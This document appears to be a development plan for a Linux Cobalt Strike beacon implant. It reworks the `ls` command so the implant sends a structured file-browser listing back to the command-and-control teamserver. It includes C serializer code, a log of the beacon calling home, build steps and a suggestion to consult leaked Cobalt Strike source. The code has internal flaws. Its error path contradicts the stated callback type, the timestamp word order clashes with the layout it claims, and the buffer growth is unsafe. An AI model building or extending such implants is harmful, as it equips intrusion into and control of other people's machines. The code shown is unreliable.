# Plan: CALLBACK_FILE for `ls` — Real File Browser Rendering

## Problem

Current `ls` command (`implant/src/commands.c:488-533`) returns plain text file names with `CALLBACK_OUTPUT` (0x00). Cobalt Strike's client deduplicates identical `CALLBACK_OUTPUT` responses received in the same tick, so rapid `ls` invocations only show one result. The output is also rendered as raw text rather than the proper file browser table with Name/Size/Modified columns.

### Symptoms (verified)

```
[12:00:53] beacon> ls
[12:00:53] [*] Tasked beacon to list files in .
[12:00:53] [+] host called home, sent: 19 bytes
[12:00:54] beacon> ls
[12:00:54] [*] Tasked beacon to list files in .
[12:00:54] [+] host called home, sent: 19 bytes
[12:00:54] beacon> ls
[12:00:54] [*] Tasked beacon to list files in .
[12:00:54] [+] host called home, sent: 19 bytes
[12:00:54] [+] received output:    ← only 1 of 3 responses renders
go
.Xauthority
Downloads
...
```

Three POSTs reach the teamserver, but the GUI collapses them to a single "received output" line because the payload is identical `CALLBACK_OUTPUT` text.

### Why `CALLBACK_OUTPUT` was rejected previously

- Windows-only commands (screenshot, keylogger, hashdump) hit the `default` case and we tried `CALLBACK_OUTPUT` to clear the pending task — but the teamserver matches pending tasks by **expected callback type**, not by data. Sending a `CALLBACK_OUTPUT` for a `CALLBACK_SCREENSHOT` task leaves the screenshot task pending and it gets re-queued.
- For `ls`, the task is real and supported; we just need to use the right callback type so the client renders it as a file browser.

## Goal

Replace the plain-text `ls` output with a proper `CALLBACK_FILE` (0x02) file browser payload so that:

1. Cobalt Strike renders a table with Name / Size / Modified columns.
2. Each response is rendered individually (no dedupe).
3. The list is clickable, matching the Windows beacon UX.

## Phases

### Phase 1 — Confirm exact byte layout

Before writing any code, capture a real Windows beacon `ls` response and decrypt it. This is the only way to avoid guessing the wire format.

**Method A — packet capture:**
1. Start a Windows beacon against your test teamserver.
2. Run `ls` on it.
3. Capture the POST with Wireshark or `tshark` on the teamserver port (default 50050).
4. Extract the encrypted blob, decrypt with the beacon's session key using `cs-decrypt-metadata.py` (already in the repo).

**Method B — source review:**
- Public leaks of Cobalt Strike 4.x contain the relevant Java code in `ServerOutput.java` / `BeaconData` (the `FileBrowseSerializer` or similar). Cross-check there.

**Expected layout from leaked source (4.x):**
```
[4B count BE]
per file:
  [4B mode BE]          // 0x10 = dir, 0x20 = file
  [4B size_lo BE]
  [4B size_hi BE]
  [8B mtime BE]         // Win32 FILETIME: 100ns intervals since 1601-01-01
  [4B name_len BE]
  [N  name UTF-8]
  [4B short_len BE]
  [M  short UTF-8]
```

If the captured bytes do not match this layout, adjust the helper below. **Do not skip this phase** — an off-by-4 or wrong endianness silently breaks rendering and there is no error message.

### Phase 2 — Add the helper

**File:** `implant/src/commands.c`, insert after `list_directory` (around line 118):

```c
static int build_file_browser(const char *path,
                               uint8_t **output, size_t *output_len)
{
    DIR *d = opendir(path);
    if (!d) {
        *output_len = snprintf(NULL, 0, "Failed to open directory '%s'\n", path) + 1;
        *output = malloc(*output_len);
        snprintf((char*)*output, *output_len, "Failed to open directory '%s'\n", path);
        return 0;
    }

    size_t cap = 4096;
    size_t len = 4;  // reserve 4 bytes for count
    uint8_t *buf = malloc(cap);
    if (!buf) { closedir(d); return -1; }
    *(uint32_t*)buf = 0;

    struct dirent *e;
    size_t count = 0;

    while ((e = readdir(d)) != NULL) {
        if (!strcmp(e->d_name, ".") || !strcmp(e->d_name, "..")) continue;

        char full[PATH_MAX];
        snprintf(full, sizeof(full), "%s/%s", path, e->d_name);

        struct stat st;
        int stat_ok = (stat(full, &st) == 0);

        size_t name_len = strlen(e->d_name);
        size_t entry_size = 4 + 4 + 4 + 8 + 4 + name_len + 4 + name_len;

        if (len + entry_size > cap) {
            cap *= 2;
            uint8_t *tmp = realloc(buf, cap);
            if (!tmp) { free(buf); closedir(d); return -1; }
            buf = tmp;
        }

        uint8_t *p = buf + len;

        // mode: 0x10 directory, 0x20 file (placeholder if stat failed)
        uint32_t mode = htonl(stat_ok
            ? (S_ISDIR(st.st_mode) ? 0x10 : 0x20)
            : 0x20);
        memcpy(p, &mode, 4); p += 4;

        // size (64-bit, split into two 32-bit BE words)
        uint64_t sz = stat_ok ? (uint64_t)st.st_size : 0;
        uint32_t slo = htonl((uint32_t)sz);
        uint32_t shi = htonl((uint32_t)(sz >> 32));
        memcpy(p, &slo, 4); p += 4;
        memcpy(p, &shi, 4); p += 4;

        // mtime: unix seconds -> Win32 FILETIME
        // 11644473600 = seconds between 1601-01-01 and 1970-01-01
        // 10000000    = 100ns intervals per second
        uint64_t ft = stat_ok
            ? ((uint64_t)st.st_mtime + 11644473600ULL) * 10000000ULL
            : 0;
        uint32_t mlo = htonl((uint32_t)ft);
        uint32_t mhi = htonl((uint32_t)(ft >> 32));
        memcpy(p, &mlo, 4); p += 4;
        memcpy(p, &mhi, 4); p += 4;

        // filename (long name)
        uint32_t nl = htonl((uint32_t)name_len);
        memcpy(p, &nl, 4); p += 4;
        memcpy(p, e->d_name, name_len); p += name_len;

        // short name (use the long name; no 8.3 conversion on Linux)
        memcpy(p, &nl, 4); p += 4;
        memcpy(p, e->d_name, name_len); p += name_len;

        len += entry_size;
        count++;
    }
    closedir(d);

    *(uint32_t*)buf = htonl((uint32_t)count);
    *output = buf;
    *output_len = len;
    return 0;
}
```

Add headers at top of `commands.c` if missing:
```c
#include <sys/stat.h>     // for stat(), S_ISDIR
#include <limits.h>       // for PATH_MAX
```

### Phase 3 — Wire the helper into COMMAND_FILE_LIST

**File:** `implant/src/commands.c:488-533`, replace the body of the `case`:

```c
case COMMAND_FILE_LIST: {
    int dirLengthOffset = 7;
    if (cmd_data_len <= dirLengthOffset) {
        fprintf(stderr, "Command too short\n");
        *callback_type = CALLBACK_ERROR;
        return -1;
    }

    uint8_t dirLength = cmd_data[dirLengthOffset] - 2;
    if (dirLengthOffset + dirLength + 2 > cmd_data_len) {
        fprintf(stderr, "Invalid directory length\n");
        *callback_type = CALLBACK_ERROR;
        return -1;
    }

    char *DirToList = malloc(dirLength + 1);
    if (!DirToList) {
        *callback_type = CALLBACK_ERROR;
        return -1;
    }
    memcpy(DirToList, cmd_data + dirLengthOffset + 1, dirLength);
    DirToList[dirLength] = '\0';

    DEBUG_PRINT("Directory to list: %s\n", DirToList);

    // Old: list_directory(DirToList, output, output_len);
    // New: build the file-browser payload
    if (build_file_browser(DirToList, output, output_len) != 0) {
        free(DirToList);
        *callback_type = CALLBACK_ERROR;
        return -1;
    }

    // Switch to file-browser callback so the CS client renders a table
    // and stops deduplicating identical responses.
    *callback_type = CALLBACK_FILE;

    free(DirToList);
    return 0;
}
```

### Phase 4 — Constant

`CALLBACK_FILE` is already defined as `0x02` in `implant/headers/commands.h:35`. No change needed.

### Phase 5 — Build and test

```bash
cd /home/kali/CS/CobaltStrike-Linux-Beacon/implant
make clean
make OUTPUT=Beacon_x64
```

Push the new binary to the test target. From the Cobalt Strike client:

1. `ls` on a normal directory — verify it renders a table with Name / Size / Modified columns.
2. Click a file name — confirm it is treated as a downloadable entry (even if the actual file download flow was not implemented, the click should at least register).
3. Run `ls` five times in quick succession (1 sec apart) — each should produce a distinct "received output" line. Dedupe is gone.
4. `ls /nonexistent` — should return the "Failed to open directory" error string (still in `CALLBACK_OUTPUT` from the helper's error path).
5. `ls /` — should list root without crashing.

### Phase 6 — Verify against Windows beacon

If anything looks wrong, compare the wire format directly:

```bash
# On the teamserver side, with the Linux beacon's session key:
cs-decrypt-metadata.py -k <session_key> -f <captured_post.bin>
```

Compare the decrypted bytes with the layout from Phase 1. Common bugs:
- Endianness flip on count or size.
- Off-by-one in `name_len` (forgetting to include the length field itself or not).
- `stat()` returning 0 for a directory (the placeholder `0x20` is fine — CS just shows it as a file).
- Empty directory not handling `count = 0` correctly.

### Edge cases and risks

| Case | Behavior |
|---|---|
| Empty directory | `count = 0`, valid payload, CS shows an empty table. |
| Permission denied on one entry | `stat()` returns `-1`, that entry gets `mode = 0x20`, `size = 0`, `mtime = 0`. Other entries still listed. |
| Permission denied on the directory itself | Helper falls back to `CALLBACK_OUTPUT` with the error string. |
| Filename with UTF-8 (Vietnamese diacritics) | Raw byte copy preserves it; CS client decodes as UTF-8. |
| Symlinks | `stat()` (not `lstat()`) follows the link, so symlinks are reported by target type. Matches Windows behavior. |
| Path > 4KB | `realloc` doubles capacity as needed. |
| Slow filesystem (NFS, SMB mount) | `stat()` per entry adds latency. For directories with thousands of entries, consider caching or skipping stat in a fast mode. |

### Fallback plan

If CS still does not render the table correctly after Phase 1 confirms the format:

1. Add a `#ifdef DEBUG` block in `beacon_send_output` that hex-dumps the unencrypted payload before encryption, so you can verify exactly what is being sent.
2. Compare side-by-side with a Windows beacon's `ls` response on the same directory.
3. If only the column rendering is off (table renders but no data), the issue is `count` being read as 0 due to endianness.

## Out of scope

- Implementing the `download` flow when the user clicks a file name in the browser. The Windows beacon's file browser is clickable; the Linux beacon's existing `COMMAND_DOWNLOAD` (id 11) handler still works, but the click-to-download integration in the file browser is a separate feature.
- Sorting, hidden files, recursive listing. Keep this change minimal.
- The default-case fix for Windows-only commands (see `BUGS.md` section 2.1) is a separate issue and should be tackled independently.
